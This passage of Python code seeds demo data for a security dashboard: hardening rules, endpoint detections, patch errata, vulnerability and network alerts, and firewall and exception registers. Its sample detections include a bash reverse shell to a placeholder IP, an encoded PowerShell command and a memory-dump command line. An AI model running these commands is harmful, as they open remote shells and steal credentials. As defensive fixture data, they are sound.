    ("CIS 1.4.1 Bootloader", "xccdf_rule_file_permissions_grub2_cfg", "Ensure permissions on bootloader config are 600", "Medium", "chmod 600 /boot/grub2/grub.cfg"),
    ("CIS 1.6.1 SELinux", "xccdf_rule_selinux_policytype", "Ensure SELinux policy is targeted", "Medium", "Set SELINUXTYPE=targeted in /etc/selinux/config."),
    ("CIS 1.6.1 SELinux", "xccdf_rule_package_setroubleshoot_removed", "Ensure SETroubleshoot is not installed", "Low", "dnf remove setroubleshoot"),
    ("CIS 2.2 Services", "xccdf_rule_package_telnet-server_removed", "Ensure telnet server is not installed", "High", "dnf remove telnet-server"),
    ("CIS 2.2 Services", "xccdf_rule_package_vsftpd_removed", "Ensure FTP server is not installed", "Medium", "dnf remove vsftpd"),
    ("CIS 2.2 Services", "xccdf_rule_service_rsyncd_disabled", "Ensure rsync service is not enabled", "Medium", "systemctl --now mask rsyncd"),
    ("CIS 2.2 Services", "xccdf_rule_package_xorg-x11-server-common_removed", "Ensure X Window System is not installed", "Low", "dnf remove xorg-x11-server-common"),
    ("CIS 3.3 Network", "xccdf_rule_sysctl_net_ipv4_conf_all_accept_redirects", "Ensure ICMP redirects are not accepted", "Medium", "sysctl -w net.ipv4.conf.all.accept_redirects=0 and persist in /etc/sysctl.d."),
    ("CIS 3.3 Network", "xccdf_rule_sysctl_net_ipv4_ip_forward", "Ensure IP forwarding is disabled", "Medium", "sysctl -w net.ipv4.ip_forward=0 and persist in /etc/sysctl.d."),
    ("CIS 3.4.1 Firewall", "xccdf_rule_firewalld_loopback_traffic_restricted", "Ensure loopback traffic is configured", "Low", "firewall-cmd --permanent --zone=trusted --add-interface=lo"),
    ("CIS 4.1.1 Auditing", "xccdf_rule_audit_rules_login_events", "Ensure login and logout events are collected", "Medium", "Add -w /var/log/lastlog -p wa -k logins to /etc/audit/rules.d/."),
    ("CIS 4.1.1 Auditing", "xccdf_rule_audit_rules_privileged_commands", "Ensure use of privileged commands is collected", "Medium", "Add audit rules for setuid / setgid programs."),
    ("CIS 4.2 Logging", "xccdf_rule_service_rsyslog_enabled", "Ensure rsyslog service is enabled", "Medium", "systemctl --now enable rsyslog"),
    ("CIS 4.2 Logging", "xccdf_rule_rsyslog_remote_loghost", "Ensure logs are sent to a remote log host", "Medium", "Add *.* @@<siem-host>:514 to /etc/rsyslog.conf."),
    ("CIS 5.2 SSH", "xccdf_rule_sshd_disable_empty_passwords", "Disable SSH access via empty passwords", "High", "Set 'PermitEmptyPasswords no' in /etc/ssh/sshd_config."),
    ("CIS 5.2 SSH", "xccdf_rule_sshd_set_idle_timeout", "Set SSH client alive interval", "Medium", "Set 'ClientAliveInterval 900' in /etc/ssh/sshd_config."),
    ("CIS 5.2 SSH", "xccdf_rule_sshd_disable_x11_forwarding", "Disable SSH X11 forwarding", "Low", "Set 'X11Forwarding no' in /etc/ssh/sshd_config."),
    ("CIS 5.3 sudo", "xccdf_rule_sudo_require_authentication", "Ensure users must provide password for privilege escalation", "Medium", "Remove NOPASSWD entries from /etc/sudoers.d."),
    ("CIS 5.4.1 Password policy", "xccdf_rule_accounts_password_pam_retry", "Ensure password retry attempts are limited", "Medium", "Set retry = 3 in /etc/security/pwquality.conf."),
    ("CIS 5.5.1 Password policy", "xccdf_rule_accounts_password_warn_age_login_defs", "Password expiration warning 7 days or more", "Low", "Set PASS_WARN_AGE 7 in /etc/login.defs."),
    ("CIS 6.1 File permissions", "xccdf_rule_file_permissions_etc_shadow", "Ensure permissions on /etc/shadow are configured", "High", "chmod 0000 /etc/shadow"),
    ("CIS 6.1 File permissions", "xccdf_rule_file_permissions_etc_passwd", "Ensure permissions on /etc/passwd are 644", "Medium", "chmod 644 /etc/passwd"),
    ("CIS 6.2.1 File permissions", "xccdf_rule_accounts_no_uid_except_zero", "Ensure root is the only UID 0 account", "High", "Remove or re-number every other UID 0 account."),
]


def seed_detections_and_satellite(c, rng):
    """Sample CrowdStrike detections over the last 30 days, and Satellite data (packages, errata, OpenSCAP MBSS) for the
    Linux hosts, so Asset 360 shows both."""
    now = db.now_iso()
    agents = db.rows(c, "SELECT aid, hostname FROM hosts WHERE console_state='active'")
    rows = []
    from .threats import DEMO_ANALYSTS
    for k in range(240):
        a = rng.choice(agents)
        sev, name, tactic, tech, disp = rng.choice(DETECTIONS)
        age = rng.uniform(0, 30)
        status = rng.choice(["new", "in_progress", "closed", "closed", "closed"])
        who = "" if status == "new" and rng.random() < 0.6 else rng.choice(DEMO_ANALYSTS[:4] + [DEMO_ANALYSTS[0]])
        upd = ts(max(0, age - rng.uniform(0.02, 2.5))) if status != "new" else ""
        rows.append((f"demo:ind:{a['aid']}:{k}", a["aid"], a["hostname"], sev, name, tactic, tech,
                     status, ts(age), f"{name} on {a['hostname']}",
                     rng.choice(["powershell.exe", "rundll32.exe", "bash", "python3", "svchost.exe"]),
                     rng.choice(["powershell -enc SQBFAFgA…", "bash -i >& /dev/tcp/203.0.113.9/443 0>&1", "rundll32.exe comsvcs.dll MiniDump"]),
                     disp, "epp", now, who, upd))
    c.executemany("""INSERT OR REPLACE INTO detections(id, aid, hostname, severity, name, tactic, technique, status, created_at,
                     description, filename, cmdline, disposition, product, fetched_at, assigned_to, updated_at)
                     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", rows)
    linux = db.rows(c, """SELECT ip, node_name, os_resolved FROM inventory_current WHERE ip NOT LIKE '%:%' AND
                          (os_resolved LIKE 'RHEL%' OR os_resolved LIKE '%Red Hat%' OR os_resolved LIKE 'CentOS%') AND COALESCE(node_name,'')<>''""")
    hosts, errata = [], []
    for hid, r in enumerate(linux, start=1):
        pick = rng.sample(ERRATA, rng.randrange(0, 6))
        inst = [e for e in pick if rng.random() < 0.8]
        for e in pick:
            errata.append((hid, e[0], e[1], e[2], e[3], ts(rng.uniform(5, 120))[:10], e[4], 1 if e in inst else 0))
        passed = rng.randrange(180, 260)
        failed = rng.randrange(0, 45)
        hosts.append((hid, f"{r['node_name'].lower()}.corp.example", db.norm_hostname(r["node_name"]), r["ip"], r["os_resolved"],
                      ts(rng.uniform(0, 3)), rng.choice(["Fully entitled", "Fully entitled", "Unsubscribed hypervisor"]),
                      rng.randrange(420, 1400), rng.randrange(0, 60), sum(1 for e in pick if e[2] == "security"),
                      sum(1 for e in pick if e[2] == "bugfix"), sum(1 for e in pick if e[2] == "enhancement"),
                      sum(1 for e in inst if e[2] == "security"), len(inst), "MBSS - RHEL Server Baseline", passed, failed,
                      rng.randrange(0, 12), ts(rng.uniform(0, 7)), now))
    c.executemany(f"INSERT INTO satellite_hosts VALUES ({','.join('?' * 20)})", hosts)
    c.executemany("INSERT INTO satellite_errata VALUES (?,?,?,?,?,?,?,?)", errata)
    # full OpenSCAP report per host: every MBSS rule with its result (pass / fail / other), grouped by CIS-style control
    mbss = []
    for h in hosts:
        fails = {r[1] for r in rng.sample(MBSS_RULES, rng.randrange(0, 7))} | {r[1] for r in MBSS_PASSING if rng.random() < 0.04}
        for rule in MBSS_RULES + MBSS_PASSING:
            res = "fail" if rule[1] in fails else "other" if rng.random() < 0.05 else "pass"
            mbss.append((h[0], rule[1], rule[2], rule[3], res, rule[0], rule[4] if res == "fail" else ""))
    c.executemany("INSERT INTO satellite_mbss VALUES (?,?,?,?,?,?,?)", mbss)
    # the counts come from the same report as the rules
    c.execute("""UPDATE satellite_hosts SET
        compliance_passed=(SELECT COUNT(*) FROM satellite_mbss m WHERE m.host_id=satellite_hosts.host_id AND m.result='pass'),
        compliance_failed=(SELECT COUNT(*) FROM satellite_mbss m WHERE m.host_id=satellite_hosts.host_id AND m.result='fail'),
        compliance_other=(SELECT COUNT(*) FROM satellite_mbss m WHERE m.host_id=satellite_hosts.host_id AND m.result='other')""")
    # prevention policies and the policy on each agent's device record
    pols = [("pp-std-srv", "Servers - Standard", "Windows", 1), ("pp-strict-dmz", "DMZ - Aggressive", "Windows", 1),
            ("pp-linux", "Linux Servers", "Linux", 1), ("pp-detect-only", "Detect only (exception)", "Windows", 1)]
    c.executemany("INSERT OR REPLACE INTO prevention_policies VALUES (?,?,?,?,?,?)", [(i, n, pl, e, "", now) for i, n, pl, e in pols])
    for h in db.rows(c, "SELECT aid, platform_name, raw FROM hosts WHERE console_state='active'"):
        d = json.loads(h["raw"] or "{}")
        pid = ("pp-linux" if h["platform_name"] == "Linux" else rng.choice(["pp-std-srv", "pp-std-srv", "pp-strict-dmz", "pp-detect-only"]))
        d["device_policies"] = {"prevention": {"policy_id": pid, "applied": rng.random() > 0.08, "applied_date": ts(rng.uniform(1, 40))}}
        c.execute("UPDATE hosts SET raw=? WHERE aid=?", (json.dumps(d), h["aid"]))
    # Spotlight: most scanner CVEs also found by the agent, plus some only the agent sees
    spot = []
    for f in db.rows(c, """SELECT DISTINCT f.cve, f.severity, h.aid, h.hostname, h.local_ip FROM vuln_findings f JOIN hosts h ON h.local_ip=f.ip
                          WHERE f.status='open' AND COALESCE(f.cve,'')<>'' AND h.console_state='active'"""):
        for cve in [x.strip() for x in f["cve"].split(",") if x.strip()]:
            if rng.random() < 0.75:
                spot.append((f"demo:spot:{f['aid']}:{cve}", f["aid"], f["hostname"], f["local_ip"], cve, f["severity"].upper(),
                             round(rng.uniform(5, 9.8), 1), rng.choice(["HIGH", "MEDIUM", "LOW"]), rng.choice(["Unproven", "Available", "Easily accessible"]),
                             "", "Apply the vendor update", "open", ts(rng.uniform(2, 60)), ts(rng.uniform(0, 2)), now))
    for a in rng.sample(agents, min(40, len(agents))):
        cve, sev, prod = rng.choice([("CVE-2026-21412", "HIGH", "Google Chrome 128"), ("CVE-2026-0102", "CRITICAL", "7-Zip 23.01"),
                                     ("CVE-2025-49144", "MEDIUM", "Notepad++ 8.6"), ("CVE-2026-3110", "HIGH", "OpenSSH 8.9")])
        spot.append((f"demo:spot:{a['aid']}:{cve}", a["aid"], a["hostname"], "", cve, sev, round(rng.uniform(6, 9.8), 1), "HIGH", "Available",
                     prod, f"Update {prod.split()[0]} to the latest version", "open", ts(rng.uniform(2, 60)), ts(0, 3), now))
    c.executemany(f"INSERT OR REPLACE INTO spotlight_vulns VALUES ({','.join('?' * 15)})", spot)
    # Seceon NDR alerts: network-side detections, some on hosts that have no EDR agent
    ndr_names = [("Outbound C2 beaconing", "High", "Command and Control"), ("SMB brute force", "Medium", "Credential Access"),
                 ("Port scan from internal host", "Low", "Discovery"), ("Data exfiltration over DNS", "Critical", "Exfiltration"),
                 ("Connection to known malicious IP", "High", "Command and Control"), ("Lateral movement over RDP", "High", "Lateral Movement")]
    ips = [r["ip"] for r in db.rows(c, "SELECT ip FROM inventory_current WHERE ip NOT LIKE '%:%' AND COALESCE(ip,'')<>''")]
    ndr = []
    for k in range(120):
        ip = rng.choice(ips)
        name, sev, cat = rng.choice(ndr_names)
        outbound = cat in ("Command and Control", "Exfiltration", "Discovery", "Lateral Movement")
        ext = f"203.0.113.{rng.randrange(1, 250)}" if cat in ("Command and Control", "Exfiltration") else rng.choice(ips)
        ndr.append((f"seceon:demo{k}", ts(rng.uniform(0, 30)), sev, name, cat, ip if outbound else ext, ext if outbound else ip, "",
                    f"{name} involving {ip}", rng.choice(["Open", "Open", "Investigating", "Closed"]), "webhook", "{}", now))
    c.executemany("INSERT OR REPLACE INTO ndr_alerts VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)", ndr)


def seed_matrix_and_sod(c, rng, nat_map):
    """A small communication matrix (inbound internet rules for the NAT-ed web tier, ISP access to the network core,
    internal flows) and an SOD exception register, loaded through the same parsers as uploads."""
    from . import commatrix, sod
    from .filetemplates import TEMPLATES
    now = db.now_iso()
    heads = [col[0] for col in TEMPLATES["comm_matrix"][3]]
    rows = []
    for n, (ip, pub, lob) in enumerate(nat_map[: max(1, len(nat_map) * 3 // 4)], start=1):
        rows.append([f"FW-DMZ-{n:04d}", "Inbound", "Internet", "Any", "", rng.choice(["ISP-A", "ISP-B"]), "DMZ-FW-01", f"allow-web-{n}",
                     "DMZ", pub, ip, "tcp", "443", f"{lob} web", "Allow", f"CR-2026-{1000 + n}", "", ""])
    rows += [["FW-ISP-0001", "Inbound", "ISP", "Any", "", "ISP-A MPLS-01", "CORE-FW-02", "isp-netconf", "Core", "", "10.30.0.10-10.30.0.25",
              "tcp", "830", "NETCONF from ISP NOC", "Allow", "CR-2026-2001", "", "Managed service access"],
             ["FW-OAM-0001", "Internal", "OAM", "10.30.8.0/24", "", "", "CORE-FW-02", "oam-ssh", "Core", "", "10.30.0.0/24", "tcp", "22",
              "OAM SSH", "Allow", "CR-2026-2002", "", ""],
             ["FW-APP-0001", "Internal", "App", "10.20.0.0/24", "", "", "CORE-FW-01", "app-db", "Data", "", "10.10.0.0/24", "tcp", "1521",
              "App to Oracle", "Allow", "CR-2026-2003", "2025-12-31", "Expired rule"],
             ["FW-OUT-0001", "Outbound", "App", "10.20.0.10-20", "203.0.113.200", "", "CORE-FW-01", "app-vendor-updates", "Internet", "", "any",
              "tcp", "https", "Vendor update / licence servers", "Allow", "CR-2026-2004", "", "Egress through source NAT 203.0.113.200"],
             # internal flows from the web tier inward: what an attacker on an exposed web server could reach (attack paths)
             ["FW-DMZ-APP-0001", "Internal", "DMZ", "10.10.0.0/24", "", "", "CORE-FW-01", "web-to-app", "App", "", "10.20.0.0/26", "tcp",
              "8080,8443", "Web to application tier", "Allow", "CR-2026-2101", "", ""],
             ["FW-APP-DB-0001", "Internal", "App", "10.20.0.0/26", "", "", "CORE-FW-01", "app-to-db", "Data", "", "10.10.1.0/26", "tcp",
              "1521,5432", "Application to databases", "Allow", "CR-2026-2102", "", ""],
             ["FW-DMZ-MGMT-0001", "Internal", "DMZ", "10.10.1.0/27", "", "", "CORE-FW-02", "dmz-to-mgmt", "Mgmt", "", "10.40.0.0/28", "tcp",
              "445,3389", "Backup agent and RDP to management", "Allow", "CR-2026-2103", "", "Review: broad management access"]]
    wbn = "communication_matrix.xlsx"
    parsed = {"headers": heads, "rows": rows, "header_row": 1, "filename": wbn}
    rules, _ = commatrix.build(parsed, commatrix.suggest_mapping(heads), "rules", wbn, "Firewall rules")
    # more sheets of the same workbook, in the hand-written styles real matrices use
    ex = nat_map[len(nat_map) * 3 // 4:]
    sheets = [
        ("Public IP pool", "public_pool", ["S.NO", "PUBLIC IP POOL", "USE", "APPLICATION", "APPLICATON OWNER"],
         [["1", "198.51.100.0/28", "Internet banking VIPs", "NetBanking", "Digital Channels"],
          ["2", "203.0.113.10/11/12", "Mail gateways", "Email", "IT Messaging"]]),
        ("NAT list", "nat_map", ["S.NO", "PUBLIC IP", "PRIVATE-IP", "APPLICAITON", "APPLICATION OWNER", "Which firewall details exposed to this IP"],
         [[str(i + 1), pub, f"h-{ip}_vm", f"{lob} portal", f"{lob} app team", "DMZ-FW-01"] for i, (ip, pub, lob) in enumerate(ex[:4])]),
        ("SOD NAT", "sod_nat", ["SODdetails", "dest_nat_ip", "destination_ip", "fwl", "location", "nat_ip", "port", "protocol", "rule", "source_ip"],
         [[f"SOD-2026-0{i + 40}", pub, ip, "EDGE-FW-02", "DC-Mumbai", "", "tcp_443;https", "tcp", f"NAT-{i + 1}", "any"]
          for i, (ip, pub, lob) in enumerate(ex[4:6])]),
        ("Exposure register", "exposure", ["S.NO", "Public IP", "Internal IP", "Port", "Service Details", "Destination IP", "REMARK", "Source Contact Details",
                                           "Planner", "Host Status", "LOB", "Domain", "MS Partner", "Subnet", "Service Owner", "Which firewall details exposed to this IP"],
         [[str(i + 1), pub, ip, "443/tcp, 8443", "Partner API", "", "", "", "", "Live", lob, "Core", "Wipro", "", f"{lob} API owner", "DMZ-FW-01"]
          for i, (ip, pub, lob) in enumerate(ex[6:8])]),
    ]
    for sheet, stype, hd, rs in sheets:
        if not rs:
            continue
        got, _ = commatrix.build({"headers": hd, "rows": rs, "header_row": 1, "filename": wbn}, commatrix.suggest_mapping(hd, stype), stype, wbn, sheet)
        rules += got
    cols = commatrix.ROW_COLS
    uid = c.execute("INSERT INTO comm_uploads(filename, note, uploaded_by, uploaded_at, rows, replaced, mapping, warnings) VALUES (?,?,?,?,?,0,'{}','[]')",
                    (wbn, "Sample matrix workbook", "demo.user", now, len(rules))).lastrowid
    c.executemany(f"INSERT INTO comm_rules({', '.join(cols)}, upload_id) VALUES ({','.join('?' * (len(cols) + 1))})",
                  [(*[r.get(k) for k in cols], uid) for r in rules])
    commatrix.apply_overrides(c)
    heads = [col[0] for col in TEMPLATES["sod"][3]]
    rows = [["SOD-2026-001", "LOB", "", "Network Core", "51192", "", "SSL Certificate Cannot Be Trusted", "", "Internal CA trusted on all OAM clients",
             "Access limited to OAM VLAN", "CISO", "2026-06-01", "2027-03-31", "RISK-4411", ""],
            ["SOD-2026-002", "Subnet", "10.20.0.0/24", "", "57582", "", "", "8443", "Vendor appliance, fix in next release", "IPS signature enabled",
             "Head of Network Security", "2026-07-15", "2026-10-15", "RISK-4502", ""],
            ["SOD-2026-003", "All", "", "", "", "CVE-2016-2183", "", "", "Legacy clients need 3DES until migration", "", "CISO", "2026-01-10",
             "2026-12-31", "RISK-4003", ""],
            ["SOD-2025-019", "IP", "10.10.0.11", "", "125313", "", "", "", "Server decommissioning", "", "CISO", "2025-06-01", "2025-12-31",
             "RISK-3310", "Expired"]]
    parsed = {"headers": heads, "rows": rows, "header_row": 1, "filename": "sod_register.xlsx"}
    ex, _ = sod.build(parsed, sod.suggest_mapping(heads))
    uid = c.execute("INSERT INTO sod_uploads(filename, note, uploaded_by, uploaded_at, rows, added, removed, mapping, warnings) VALUES (?,?,?,?,?,?,0,'{}','[]')",
                    ("sod_register.xlsx", "Sample register", "demo.user", now, len(ex), len(ex))).lastrowid
    c.executemany(f"INSERT INTO vuln_exceptions({', '.join(sod.KEYS)}, upload_id, created_at) VALUES ({','.join('?' * (len(sod.KEYS) + 2))})",
                  [(*[r[k] for k in sod.KEYS], uid, now) for r in ex])
    inventory.refresh_matches(c)
